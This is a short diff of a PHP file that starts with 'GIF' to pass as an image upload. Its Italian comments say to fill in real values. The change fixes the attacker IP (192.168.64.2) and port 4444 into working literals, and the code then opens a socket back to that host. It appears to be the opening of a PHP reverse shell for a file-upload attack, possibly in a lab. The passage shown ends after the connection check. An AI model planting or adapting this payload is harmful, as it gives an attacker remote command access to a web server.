@@ -1,7 +1,7 @@
 GIF<?php
 // CONFIGURA QUESTI VALORI CON I TUOI DATI REALI:
-$ip = '[192.168.64.2]'; // Esempio: '192.168.1.10'
-$port = [4444];     // Esempio: 4444
+$ip = '192.168.64.2'; // Esempio: '192.168.1.10'
+$port = 4444;     // Esempio: 4444
 
 $sock = fsockopen($ip, $port);
 if ($sock === false) {
